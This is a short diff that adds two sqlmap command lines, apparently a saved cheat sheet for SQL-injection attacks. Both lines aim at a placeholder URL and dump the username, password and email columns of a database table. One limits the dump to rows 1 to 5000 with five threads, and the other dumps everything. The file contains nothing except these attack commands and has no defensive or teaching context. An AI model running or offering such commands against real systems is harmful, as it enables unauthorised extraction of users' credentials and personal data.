@@ -1,0 +1,3 @@
+sqlmap.py -u url -D "data"  -T "tables" -C "username,password,email" --dump --threads=5 --start=1 --stop=5000
+
+sqlmap.py -u url -D "data"  -T "tables" -C "username,password,email" --dump-all -v 0
